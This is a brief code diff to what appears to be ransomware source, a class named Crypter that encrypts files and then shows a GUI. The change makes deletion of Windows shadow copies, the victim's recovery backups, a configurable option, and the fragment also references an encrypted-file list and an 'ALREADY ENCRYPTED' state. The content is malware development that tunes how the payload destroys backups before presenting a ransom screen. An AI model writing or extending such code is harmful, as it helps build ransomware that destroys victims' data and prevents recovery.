@@ -55,7 +55,8 @@ class Crypter(Base.Base):
       if not os.path.isfile(self.encrypted_file_list):
           return
       # Delete Shadow Copies
-      self.__delete_shadow_files()
+      if "delete_shadow_copies" in self.__config:
+          self.__delete_shadow_files()
       # Present GUI
       self.start_gui()
     # ALREADY ENCRYPTED
